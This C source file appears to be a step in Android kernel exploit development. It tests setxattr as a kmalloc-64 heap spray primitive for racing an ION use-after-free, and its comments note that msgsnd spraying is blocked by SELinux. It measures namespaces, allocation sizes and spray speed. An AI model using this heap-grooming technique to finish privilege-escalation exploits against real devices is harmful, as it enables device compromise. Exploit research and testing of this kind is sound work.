/*
 * xattr_spray.c — Test setxattr as a kmalloc-64 spray mechanism
 * 
 * setxattr() allocates from kmalloc-N with user-controlled content.
 * Unlike msgsnd (blocked by SELinux), setxattr may work.
 * The allocation is temporary (freed after the syscall), but we can
 * use it in a tight race with the ION UAF.
 *
 * Also tests: listxattr, fsetxattr
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/xattr.h>
#include <sys/types.h>
#include <time.h>

int main(void) {
    printf("=== setxattr Spray Test ===\n");

    const char *path = "/data/local/tmp/xattr_test";
    
    /* Create test file */
    int fd = open(path, O_CREAT | O_WRONLY, 0666);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    close(fd);

    /* Test 1: Basic setxattr */
    char value[64];
    memset(value, 'A', sizeof(value));

    int ret;

    /* Try user.* namespace */
    ret = setxattr(path, "user.test1", value, sizeof(value), 0);
    printf("[*] setxattr user.test1: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Try security.* namespace */
    ret = setxattr(path, "security.test1", value, sizeof(value), 0);
    printf("[*] setxattr security.test1: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Try trusted.* namespace */
    ret = setxattr(path, "trusted.test1", value, sizeof(value), 0);
    printf("[*] setxattr trusted.test1: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));

    /* Test 2: Various sizes to find which hits kmalloc-64 */
    printf("\n[*] Size tests:\n");
    for (int sz = 1; sz <= 256; sz *= 2) {
        char val[256];
        memset(val, 'B', sz);
        char name[32];
        snprintf(name, sizeof(name), "user.sz%d", sz);
        ret = setxattr(path, name, val, sz, 0);
        printf("  size=%3d: ret=%d err=%d (%s)\n",
               sz, ret, errno, strerror(errno));
    }

    /* Test 3: Can we do fsetxattr? */
    printf("\n[*] fsetxattr test:\n");
    fd = open(path, O_RDWR);
    if (fd >= 0) {
        ret = fsetxattr(fd, "user.ftest", value, 64, 0);
        printf("  fsetxattr: ret=%d errno=%d (%s)\n",
               ret, errno, strerror(errno));
        close(fd);
    }

    /* Test 4: setxattr on /proc (tmpfs) */
    printf("\n[*] setxattr on /proc/self/attr/current:\n");
    ret = setxattr("/proc/self/attr/current", "user.test", value, 64, 0);
    printf("  ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));

    /* Test 5: setxattr on /data/local/tmp (ext4) */
    printf("\n[*] setxattr on /data/local/tmp/:\n");
    ret = setxattr("/data/local/tmp", "user.test", value, 64, 0);
    printf("  ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));

    /* Test 6: Rapid spray - how fast can we setxattr? */
    printf("\n[*] Spray speed test:\n");
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    int count = 0;
    for (int i = 0; i < 10000; i++) {
        /* setxattr allocates, copies, calls handler, frees
         * Even if it fails, the kmalloc+copy+kfree happens */
        ret = setxattr(path, "user.spray", value, 40, 0);
        if (ret == 0 || errno == EEXIST || errno == ENOTSUP) count++;
    }
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) + 
                     (end.tv_nsec - start.tv_nsec) / 1e9;
    printf("  %d iterations in %.3f sec (%.0f/sec)\n",
           count, elapsed, count / elapsed);

    /* Cleanup */
    unlink(path);

    return 0;
}
